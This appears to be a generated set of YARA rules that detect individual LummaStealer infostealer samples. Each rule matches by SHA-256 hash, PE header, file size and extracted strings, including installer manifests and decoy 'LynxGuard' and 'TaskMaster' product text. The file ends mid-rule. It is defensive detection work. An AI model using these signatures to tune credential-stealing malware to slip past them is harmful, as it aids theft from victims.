rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__55d8dc6d {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_55d8dc6d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "55d8dc6d475a919fe7ec17bd2575cf0f0a1eec913dba89f9556b69621eec0eb6"
   strings:
      $s1 = "AT000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162" ascii /* score: '9.00'*/
      $s2 = "jyfscsgs" fullword ascii /* score: '8.00'*/
      $s3 = "dpiqgnbb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__ed3cc774 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_ed3cc774.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ed3cc77496b0138f2ed4fae290e4276c3a09a81ee66910803ae3375bf2bd7aec"
   strings:
      $s1 = "7\\,!7\\,}" fullword ascii /* score: '9.00'*/ /* hex encoded string 'w' */
      $s2 = " - I#j" fullword ascii /* score: '9.00'*/
      $s3 = "rivqsbng" fullword ascii /* score: '8.00'*/
      $s4 = "bpoppysk" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__78e82c73 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_78e82c73.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "78e82c73bed0e807c52a1be08ac1bb5e807678e2bcc6ba4bd4f062bbebd5b9db"
   strings:
      $s1 = ":4>5<<>=>$>%>,>->" fullword ascii /* score: '9.00'*/ /* hex encoded string 'E' */
      $s2 = "jstsulnn" fullword ascii /* score: '8.00'*/
      $s3 = "jvfhinys" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__2aee109d {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_2aee109d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2aee109d908ce8a40c9f81acaac7832b0812c32b4f3ab98df8c0b4a65e51a566"
   strings:
      $s1 = "LOgWQ/," fullword ascii /* score: '9.00'*/
      $s2 = "V\"RFnQ -F" fullword ascii /* score: '8.00'*/
      $s3 = "jetvxfnk" fullword ascii /* score: '8.00'*/
      $s4 = "lrdgguoz" fullword ascii /* score: '8.00'*/
      $s5 = "u\"%I -" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__525811f6 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_525811f6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "525811f6395a854a5b11484a17997c6dc6591fa01fee03bdcf7a8855096905b6"
   strings:
      $s1 = "USER32.dql" fullword ascii /* score: '13.00'*/
      $s2 = "o -s iy " fullword ascii /* score: '9.00'*/
      $s3 = "[ '%i%" fullword ascii /* score: '8.00'*/
      $s4 = "fygozjgr" fullword ascii /* score: '8.00'*/
      $s5 = "rtkktlcp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__4219906d {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_4219906d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4219906d821db1a543a7a0f80ebf907c2acf7dd00fd8c8bdd9088f6281a9b22e"
   strings:
      $s1 = "lqftwcia" fullword ascii /* score: '8.00'*/
      $s2 = "pthnwkdc" fullword ascii /* score: '8.00'*/
      $s3 = "ZzUSER3" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__5e083305 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_5e083305.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5e083305edc914587067c41a633ef42ee5af8f9d4b56bf60b273cd50c1a5c534"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.68.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "smmmppp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__1421d669 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_1421d669.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1421d669730ac9f067eb1845c26d76f2b9f371171058f9755436591de96332f7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v6.81.6-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "\\0Y:\\r" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__8209be8c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_8209be8c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8209be8ca3e113b6dacd01eae02e28a95f61395405dd1f11704e4de53ea1cb40"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.82.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = ":?4\\3,3^7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'C7' */
      $s4 = "HMBm'- A" fullword ascii /* score: '8.00'*/
      $s5 = "DBLLPT -." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__e502ecef {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_e502ecef.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e502ecef18931879c06a69026bfa96c0be0f24cac1769a55832056a3b51949f8"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v8.26.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__3f74af61 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_3f74af61.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3f74af617a65716135c4da420dac8b518557aa96179870a545aaee94bd878b97"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v2.25.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "333@232?'('/" fullword ascii /* score: '9.00'*/ /* hex encoded string '322' */
      $s4 = "M - JMq" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__9dcf1dc1 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_9dcf1dc1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9dcf1dc152d3fa423c4d9d0ccac98ef54a4e5b43d02ee87d596fa0b772d62394"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.91.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__5198e499 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_5198e499.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5198e4990bdd2cf13a830a459b2309ae8b3e6fbfdd4a8aef599037d82c5a07bf"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.26.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "dggdggff" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__6e85fc9c {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_6e85fc9c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6e85fc9c4f8a1c79c47d2efd739dd934935cbc53f61a58a9d607b880484594c7"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v3.14.6-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* zXUUM5Fm" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__5056fbb9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_5056fbb9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5056fbb95db91b575e2ed58b57b5a131eadf92973ed3670a487f0e6f6beaaa0c"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v3.89.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__2e370b17 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_2e370b17.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2e370b17d5a55d8a5621f677eafe2049055bc46acdbfe9e6a8ad9eda32c55ce5"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.29.9-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "$jDLLL$;?" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__e8f5e3aa {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_e8f5e3aa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e8f5e3aa9cfab4e2deb1a064ec2e4063968f83bb2911c1cd2f736674d1038101"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.48.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* i'R\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__00905b98 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_00905b98.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00905b98dcb546cd26d39de53867ee363a02e6533d83fb2204f8a8fe57b7ba0e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v9.91.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "6e4\\`{_6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'nF' */
      $s4 = "@KDLL_t3o" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__844c22e3 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_844c22e3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "844c22e3f24d8a841650d76cc626c92debb5aec830f374051c084d5a6e4e91f6"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.25.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "KqJz!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__060e32c4 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_060e32c4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "060e32c426a4cfc130761f1739518723eb99cd6c3888f08f1d55df742b3b65da"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v3.95.2-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "coaoeoc" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__bde2e44f {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_bde2e44f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bde2e44fce18b40c376b567419758cd15551227e87e0fa6c916acba77971f14d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.35.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "XhSpyD~" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__459d49fc {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_459d49fc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "459d49fcb927b6b2bc56599db3c1c99445056436eceb60aa778a175a23d08d07"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v8.99.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* aE<q" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "170731ba212e1e346f8ca5235b8831d8c23a19c5859accb7a423aec3231f625f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.26.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "HjbxBcZp8XQe.MFY\"@9K" fullword ascii /* score: '10.00'*/
      $s4 = "d Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. ThreatGuard " ascii /* score: '9.00'*/
      $s5 = "LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. Thre" ascii /* score: '9.00'*/
      $s6 = "Guard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. ThreatGu" ascii /* score: '9.00'*/
      $s7 = "reatGuard Innovations LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for " ascii /* score: '9.00'*/
      $s8 = "ons LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. " ascii /* score: '9.00'*/
      $s9 = "ection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced sca" ascii /* score: '9.00'*/
      $s10 = "s LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. Th" ascii /* score: '9.00'*/
      $s11 = "ed scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. ThreatGuard Innovati" ascii /* score: '9.00'*/
      $s12 = "novations LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detec" ascii /* score: '9.00'*/
      $s13 = "atGuard Innovations LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for th" ascii /* score: '9.00'*/
      $s14 = "ing for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations Lynx" ascii /* score: '9.00'*/
      $s15 = "tions LynxGuard Advanced scanning for threat detection. ThreatGuard Innovations LynxGuard Advanced scanning for threat detection" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__d77c43c0 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_d77c43c0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d77c43c0b9a4a3f1101bd6eb2399d11a8d469fddb525a59c30a7a7d09ebb29dc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v6.51.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__1d1b681a {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_1d1b681a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d1b681a2729b8b7a97538a4305f59bb95c7e9a616bbb247e80661bd502e1d92"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.98.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "MU]Gcfp* p" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__cc54d677 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_cc54d677.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc54d67762bef5bfe5633dd9474b6667bf6a792d9e1335a2fce17b9d9c54659a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v7.78.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "UEU9US5TMUk" fullword ascii /* base64 encoded string 'PE=Q.S1I' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__75ad1f30 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_75ad1f30.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "75ad1f30b7571830a5fb5688222e9333b91fdefea0b83170e8f5b3544851aebc"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.58.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* )$UX" fullword ascii /* score: '9.00'*/
      $s4 = "oBAO|+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__deb00e79 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_deb00e79.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "deb00e7986a41df0d30d0bcb8874e89ed8fba52ae00f86352f7667304a4b5791"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v5.88.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "oductivityMaster Solutions Inc. TaskMaster Task management and productivity tool for organized work processes. ProductivityMaste" ascii /* score: '15.00'*/
      $s4 = "oductivity tool for organized work processes. ProductivityMaster Solutions Inc. TaskMaster Task management and productivity tool" ascii /* score: '15.00'*/
      $s5 = "ement and productivity tool for organized work processes. ProductivityMaster Solutions Inc. TaskMaster Task management and produ" ascii /* score: '15.00'*/
      $s6 = " productivity tool for organized work processes. ProductivityMaster Solutions Inc. TaskMaster Task management and productivity t" ascii /* score: '15.00'*/
      $s7 = "utions Inc. TaskMaster Task management and productivity tool for organized work processes. ProductivityMaster Solutions Inc. Tas" ascii /* score: '15.00'*/
      $s8 = "Solutions Inc. TaskMaster Task management and productivity tool for organized work processes. ProductivityMaster Solutions Inc. " ascii /* score: '15.00'*/
      $s9 = "c. TaskMaster Task management and productivity tool for organized work processes. ProductivityMaster Solutions Inc. TaskMaster T" ascii /* score: '15.00'*/
      $s10 = "agement and productivity tool for organized work processes. ProductivityMaster Solutions Inc. TaskMaster Task management and pro" ascii /* score: '15.00'*/
      $s11 = "TaskMaster Task management and productivity tool for organized work processes. ProductivityMaster Solutions Inc. TaskMaster Task" ascii /* score: '15.00'*/
      $s12 = "ster Solutions Inc. TaskMaster Task management and productivity tool for organized work processes. ProductivityMaster Solutions " ascii /* score: '15.00'*/
      $s13 = " organized work processes. ProductivityMaster Solutions Inc. TaskMaster Task management and productivity tool for organized work" ascii /* score: '15.00'*/
      $s14 = "ter Solutions Inc. TaskMaster Task management and productivity tool for organized work processes. ProductivityMaster Solutions I" ascii /* score: '15.00'*/
      $s15 = "olutions Inc. TaskMaster Task management and productivity tool for organized work processes. ProductivityMaster Solutions Inc. T" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__32f3282581436269b3a75b6675fe3e08_imphash__66055f98 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_66055f98.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "66055f98d8b1e513d5312cc62b1644aa478f0611feb9353539e805c4daa7e0b0"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = " Install System v1.11.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s3 = "* t@GQ" fullword ascii /* score: '9.00'*/
      $s4 = "4\\^]]9\\" fullword ascii /* score: '9.00'*/ /* hex encoded string 'I' */
      $s5 = "B^?%I%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__774fb755 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_774fb755.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
